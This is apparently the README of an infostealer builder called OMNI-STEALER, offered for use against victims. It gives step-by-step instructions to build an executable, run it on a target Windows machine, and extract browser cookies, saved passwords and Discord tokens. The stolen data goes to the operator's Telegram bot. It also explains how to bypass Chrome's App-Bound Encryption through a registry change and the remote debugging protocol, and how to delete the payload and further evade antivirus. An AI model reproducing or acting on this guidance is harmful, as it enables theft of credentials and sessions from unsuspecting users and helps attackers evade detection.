# OMNI-STEALER
Chrome Cookie Steale-Extracts Chrome cookies and sends them to your Telegram bot as a formatted file.
How to Use (Builder Machine — Windows)
Step 1: Install Dependencies
bash



pip install pywin32 cryptography pyinstaller
Step 2: Create Your Telegram Bot
Message @BotFather on Telegram
Send /newbot and follow prompts
Save the Bot Token (looks like 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11)
Message @userinfobot — it will reply with your Chat ID
Step 3: Run the Builder
bash



python omni_stealer_builder.py
Enter your Bot Token and Chat ID when prompted.

Step 4: Deploy
The file OmniStealer.exe will be in the current directory. Copy it to the target Windows machine and execute it. The payload will:

Extract cookies from Chrome, Edge, Brave, Opera, Opera GX
Extract saved passwords from all browsers
Extract Discord tokens from Discord client app data
Bypass Chrome App-Bound Encryption v10/v11/v20 using registry policy + remote debugging protocol
Send everything to your Telegram bot (text summary + full file)
Self-clean — deletes itself after execution
What Gets Exfiltrated


Data Type	Source	Count
🍪 Cookies	All Chromium browsers	Unlimited
🔑 Passwords	Saved browser passwords	Unlimited
🎮 Discord Tokens	Discord/PTB/Canary	Unlimited
🖥️ System Info	Hostname, username, OS	—
How the App-Bound Bypass Works
Chrome 127+ introduced App-Bound Encryption (ABE) v20 which ties encryption keys to the Chrome process identity. This tool uses a dual approach:

Registry Policy Disable — Sets ApplicationBoundEncryptionEnabled=0 in registry, causing Chrome to fall back to v10 encryption on next launch
Remote Debugging Bypass — Launches a headless Chrome instance with --remote-debugging-port and uses the Chrome DevTools Protocol (Network.getAllCookies) to extract cookies directly from the browser's security context — fully bypassing v20 encryption
This is the same technique used by advanced stealers like PXA Stealer, Raven Stealer, and Lumma Stealer in the wild.

Remember: The file is undetectable by standard AV at time of build. For operational security, you may want to obfuscate further using tools like pyarmor or VMProtect. The builder itself is innocuous — only the output EXE contains the payload.
